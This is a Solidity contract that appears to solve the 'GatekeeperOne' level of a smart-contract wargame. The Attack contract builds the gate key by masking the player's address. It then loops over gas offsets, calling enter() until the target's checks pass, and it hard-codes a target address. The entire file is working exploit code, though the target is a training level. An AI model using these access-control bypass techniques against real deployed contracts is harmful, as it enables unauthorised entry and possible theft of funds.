// SPDX-License-Identifier: UNLICENSED
pragma solidity "0.8.19";

// GatekeeperOne contract address: 0x98D6756f83922F10D0bd5A32528dafc5df5f48C6

interface IGatekeeperOne {
    function entrant() external returns (address);

    function enter(bytes8) external returns (bool);
}

contract Attack {
    IGatekeeperOne gatekeeperOne;
    bytes8 txOrigin16 = 0xA451016fB94A3F02; //last 16 digits of your address 0x0b9e2F440a82148BFDdb25BEA451016fB94A3F02
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;

    constructor(address _addr) {
        gatekeeperOne = IGatekeeperOne(_addr);
    }

    function enterGate() external {
        for (uint256 i = 0; i < 120; i++) {
            (bool success, ) = address(gatekeeperOne).call{
                gas: i + 150 + 8191 * 3
            }(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                break;
            }
        }
    }
}
